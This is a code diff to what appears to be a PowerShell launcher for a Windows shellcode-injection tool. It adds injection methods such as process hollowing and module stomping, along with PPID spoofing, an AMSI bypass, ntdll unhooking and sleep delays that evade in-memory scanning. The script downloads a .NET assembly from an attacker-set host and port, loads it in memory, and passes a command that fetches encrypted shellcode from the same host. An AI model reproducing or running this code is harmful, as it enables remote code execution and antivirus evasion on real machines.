@@ -1,4 +1,23 @@
-# module name
+<#
+.DESCRIPTION
+
+Module name. Choose from:
+  
+  "functionpointer",
+  "functionpointerv2",
+  "clipboardpointer",
+  "currentthread",
+  "currentthreaduuid",
+  "remotethread",
+  "remotethreaddll",
+  "remotethreadview",
+  "remotethreadsuspended",
+  "remotethreadkernelcb",
+  "remotethreadapc",
+  "remotethreadcontext",
+  "processhollowing",
+  "modulestomping"
+#>
 $A = "currentthread"
 
 # lhost
@@ -16,39 +35,58 @@ $E = "enc"
 # password to decrypt the shellcode
 $F = "Passw0rd!"
 
-# path to the image of a newly spawned process to inject into (used in "remotethreadapc", "remotethreadcontext" and "processhollow")
+# path to the image of a newly spawned process to inject into (used in "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
 $G = "C:\Windows\System32\svchost.exe"
 
-# existing process name to inject into (used in "remotethread" and "remotethreadsuspended")
+# existing process name to inject into (used in "remotethread", "remotethreaddll", "remotethreadview", "remotethreadsuspended" and "remotethreadkernelcb")
 $H = "notepad"
 
-# parent process name to spoof the original value (use "0" to disable PPID spoofing)
+# parent process name to spoof the original value (use "0" to disable PPID spoofing) (used in "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
 $I = "explorer"
 
-# block 3rd-party DLLs ("True" / "False")
-$J = "True"
+# loaded module (DLL) name to overwrite its .text section for storing the shellcode (used in "remotethreaddll")
+$J = "msvcp_win.dll"
+
+# name of the module (DLL) to stomp (used in "modulestomping")
+$K = "xpsservices.dll"
+
+# exported function to overwrite (used in "modulestomping")
+$L = "DllCanUnloadNow"
+
+# block 3rd-party DLLs ("True" / "False") (used in "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
+$M = "True"
 
 # bypass AMSI ("True" / "False")
-$K = "True"
+$N = "True"
+
+# unhook ntdll.dll ("True" / "False")
+$O = "False"
+
+# number of seconds (approx.) to sleep before execution to evade in-memory scan (for values greater than "60" it will take much longer to sleep)
+$P = "0"
 
 # --------------------------------------------------------------------
 
-$methods = @("remotethread", "remotethreadsuspended")
+$methods = @("remotethread", "remotethreaddll", "remotethreadview", "remotethreadsuspended", "remotethreadkernelcb")
 if ($methods.Contains($A)) {
     $H = (Start-Process -WindowStyle Hidden -PassThru $H).Id
 }
 
-$methods = @("remotethreadapc", "remotethreadcontext", "processhollow")
+$methods = @("remotethreadapc", "remotethreadcontext", "processhollowing", "modulestomping")
 if ($methods.Contains($A)) {
     try {
         $I = (Get-Process $I -ErrorAction Stop).Id
+        # if multiple processes exist with the same name, arbitrary select the first one
+        if ($I -is [array]) {
+            $I = $I[0]
+        }
     }
     catch {
         $I = 0
     }
 }
 
-$cmd = "${A} /sc:http://${B}:${C}/${E} /password:${F} /image:${G} /pid:${H} /ppid:${I} /blockDlls:${J} /am51:${K}"
+$cmd = "${A} /sc:http://${B}:${C}/${E} /password:${F} /image:${G} /pid:${H} /ppid:${I} /dll:${J} /stomp:${K} /export:${L} /blockDlls:${M} /am51:${N} /unhook:${O} /sleep:${P}"
 
 $data = (IWR -UseBasicParsing "http://${B}:${C}/${D}").Content
 $assem = [System.Reflection.Assembly]::Load($data)
